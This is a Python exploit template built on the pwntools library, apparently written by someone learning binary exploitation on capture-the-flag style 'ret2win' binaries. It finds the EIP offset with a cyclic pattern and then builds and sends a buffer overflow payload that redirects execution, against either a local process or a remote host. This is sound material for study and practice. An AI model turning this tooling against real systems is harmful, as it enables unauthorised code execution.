import sys
import argparse
from pwn import *

class BinaryExploit:

    """
    Class for performing binary exploitation.

    Args:
        binary_path (str): Path to the binary to exploit

    Attributes:
        binary_path (str): Path to the binary to exploit
        elf (ELF): ELF object representing the binary
    """


    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.elf = context.binary = ELF(self.binary_path, checksec=True)
        self.setup_context()

    def setup_context(self):
        """
        Set up the context for binary exploitation.
        """
        context.log_level = 'info'
        context.delete_corefiles = True


    def generate_first_payload(self, length):
        """
        Generate the first payload to crash the program and find the offset.

        Args:
            length (int): Length of the cyclic pattern to generate.

        Returns:
            bytes: The generated cyclic payload.
        """

        return cyclic(length)
    def send_payload(self, io, trigger, payload):
        """
        Send a payload to the process.

        Args:
            io: Process or GDB debug session object
            trigger (str): Trigger string to wait for before sending the payload
            payload (str): Payload to send

        Returns:
            io: Process or GDB debug session object
        """
        io.sendlineafter(trigger, payload)
        return io
    

    def generate_second_payload(self, offset, target_function, extra_padding=0):
        """
        Generate the second payload with the correct offset and target address.

        Args:
            offset (int): Offset to the return address.
            target_function (str): Name of the function to return to.
            extra_padding (int, optional): Additional padding needed for payload.

        Returns:
            bytes: The crafted payload.
        """
        p32 = lambda x: struct.pack('<L', x)  # Use p64 for 64-bit binaries
        nop_sled = asm('nop') * offset
        target_address = p32(self.elf.symbols[target_function])
        padding = cyclic(extra_padding)
        return flat(nop_sled, target_address, padding)
    def start(self, gdb_script='', gdb_enabled=False, *a, **kw):
        """
        Start the binary process for exploitation.

        Args:
            gdb_script (str, optional): GDB script to run (default: '')
            gdb_enabled (bool, optional): Enable GDB debugging (default: False)
            *a: Additional positional arguments
            **kw: Additional keyword arguments

        Returns:
            process or gdb.debug: Process or GDB debug session object
        """
        if gdb_enabled:
            return gdb.debug([self.binary_path] + kw.get('argv', []), gdbscript=gdb_script, *a, **kw)
        else:
            return process([self.binary_path] + kw.get('argv', []), *a, **kw)
        


    def find_offset(self, io, register_name):
        """
        Find the offset of a register value in the crashed process.

        Args:
            io: Process or GDB debug session object
            register_name (str): Name of the register to find the offset for

        Returns:
            int: Offset of the register value
        """
        io.wait()
        core = io.corefile
        register_value = getattr(core, register_name)
        offset = cyclic_find(register_value)
        info('located {} offset at {}'.format(register_name.upper(), offset))
        return offset



# Main usage
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Binary Exploitation Script")
    parser.add_argument("binary_path", help="Path to the binary to exploit")
    parser.add_argument("--remote_host", help="Remote host to exploit", default=None)
    parser.add_argument("--remote_port", type=int, help="Remote port to exploit", default=None)
    parser.add_argument("--gdb", action="store_true", help="Enable GDB")
    args = parser.parse_args()

    exploit = BinaryExploit(args.binary_path)
    gdb_script = 'init-peda\ncontinue\n'

    # Start the process and find the offsets
    if args.remote_host and args.remote_port:
        io = remote(args.remote_host, args.remote_port)
    else:
        io = exploit.start(gdb_script=gdb_script, gdb_enabled=args.gdb)
    first_payload = cyclic(100)
    io.sendlineafter('>', first_payload)
    eip_offset = exploit.find_offset(io, 'eip')
    io.close()

    print("EIP offset is: {}".format(eip_offset))

# =================================================================
#                 EXPLOITATION CODE GOES HERE     by:h8handles    ||
# =================================================================     
# Example:                                                        \
#    payload = ...                                               \ 
#    io = exploit.start(...)                                     /
#    io.sendlineafter('>', payload) # Send the payload           |   
#    ...                                                         |   
#=================================================================
'''

    # First stage: Crash the process and find the offsets
    io = exploit.start()
    first_payload = exploit.generate_first_payload(100)
    io = exploit.send_payload(io, '>', first_payload)
    eip_offset = exploit.find_offset(io, 'eip')
    io.close()

    # Second stage: Craft and send the payload with the correct offset
    second_payload = exploit.generate_second_payload(eip_offset, 'ret2win')
    io = exploit.start()
    io = exploit.send_payload(io, '>', second_payload)

    # Open an interactive session to interact with the program
    io.interactive()

'''

##############################################################################################################
#
#   Issues:
#   1. The the offset is not dynamic
#   2. The payload x64 section needs to handle for the x64 register names

# this is a work in progress while I learn binary exploitation : )
#
#
